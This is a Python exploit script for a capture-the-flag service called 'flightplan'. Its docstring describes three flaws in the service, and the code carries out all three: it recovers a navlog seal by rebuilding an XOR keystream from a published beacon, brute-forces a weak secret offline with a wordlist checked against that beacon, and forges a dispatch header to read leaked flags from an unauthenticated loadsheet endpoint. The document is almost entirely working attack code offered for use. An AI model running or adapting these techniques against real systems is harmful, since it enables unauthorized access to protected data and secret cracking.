"""flightplan (4729) -- recover the navlog seal without owning the plan.

The seal is a bare XOR whose keystream is blake2s-derived from a prefix, the
ident and the route fingerprint. /airac.json publishes station_beacon(), which
is both halves of the problem:

  A  pre-patch, stream_bytes seeds from station_beacon() itself -- the service
     hands over the seed material, so the secret behind it is irrelevant and
     rotating AIRAC_SECRET alone changes nothing.
  B  post-patch, the seed is AIRAC_SECRET directly, but the beacon is still
     blake2s(AIRAC_SECRET) -- an offline verification oracle, so any pinned or
     low-entropy key falls to a wordlist.
  C  pre-patch, the loadsheet ops block has no owner predicate, so a
     compatibility_tag computed from the public packet leaks the flag in clear.

Usage: python3 fp2.py <host> <flagid>
"""
import sys, json, base64, zlib, hashlib, re, requests

F = re.compile(r'[A-Z0-9]{31}=')
def out(v):
 for m in F.findall(v if isinstance(v, str) else ''): print(m)

def stream(prefix, ident, fp, n):
 k = hashlib.blake2s(prefix + (':%s:%s' % (ident[:6], fp[-8:])).encode(),
                     digest_size=16, person=b'RTEKEY').digest()
 o, c = bytearray(), 0
 while len(o) < n:
  c += 1
  o += hashlib.blake2s(('%s:%s:%d' % (ident, fp, c)).encode(), key=k,
                       digest_size=32, person=b'NAVSEAL').digest()
 return bytes(o[:n])

def unseal(prefix, p):
 s = p['navlog_seal']; t = base64.urlsafe_b64decode(s + '=' * (-len(s) % 4))
 d = bytes(a ^ b for a, b in zip(t, stream(prefix, p['ident'], p['fingerprint'], len(t))))
 return json.loads(zlib.decompress(d)).get('remarks', '')

def tag(p):
 m = '%s:%s:%s:%d' % (p['ident'], p['fingerprint'], p['departure'], int(p['updated_at']) // 300)
 return hashlib.blake2s(m.encode(), digest_size=12, person=b'LDREV3').hexdigest()

def secrets_for(beacon):
 """Candidate AIRAC_SECRETs verified offline against the published beacon."""
 w = ['north-atlantic-track-briefing-2026', 'airac', 'flightplan', 'cairn', 'secret',
      'changeme', 'password', 'cubectf', 'cube', 'glitch', 'navlog', 'briefing',
      'dispatch', 'station', 'loadsheet', 'flightplan-secret', 'airac-secret']
 c = list(w)
 for b in w:
  for y in range(2024, 2029):
   c += ['%s-%d' % (b, y), '%s%d' % (b, y), '%s_%d' % (b, y)]
  c += [b.upper(), b + '!', b + '123']
 for s in c:
  if hashlib.blake2s(s.encode(), digest_size=32, person=b'AIRAC260').hexdigest() == beacon:
   return s
 return None

def exploit(h, fid):
 u = 'http://%s:4729' % h
 try:
  beacon = requests.get(u + '/airac.json', timeout=8).json()['station_beacon']
 except Exception as e:
  print('beacon', e, file=sys.stderr); beacon = None
 try:
  p = requests.get('%s/api/briefing/%s' % (u, fid), timeout=8).json()
 except Exception as e:
  print('briefing', e, file=sys.stderr); return

 # C -- unauthenticated loadsheet ops leak
 try:
  x = base64.urlsafe_b64encode(json.dumps(
      {'station': p['departure'], 'accept': ['ops'], 'profile': {'cap': tag(p)}}).encode()).decode()
  r = requests.get('%s/api/briefing/%s/loadsheet' % (u, fid),
                   headers={'X-Dispatch-Client': x}, timeout=8).json()
  out(r.get('ops', {}).get('crew_channel', ''))
 except Exception as e:
  print('C', e, file=sys.stderr)

 if not beacon: return
 # A -- beacon is the pre-patch seed prefix; no secret needed
 try: out(unseal(beacon.encode(), p))
 except Exception as e: print('A', e, file=sys.stderr)
 # B -- beacon as an offline oracle for a pinned secret
 try:
  s = secrets_for(beacon)
  if s: out(unseal(s.encode(), p))
  else: print('B no candidate matched beacon', file=sys.stderr)
 except Exception as e:
  print('B', e, file=sys.stderr)

exploit(sys.argv[1], sys.argv[2])
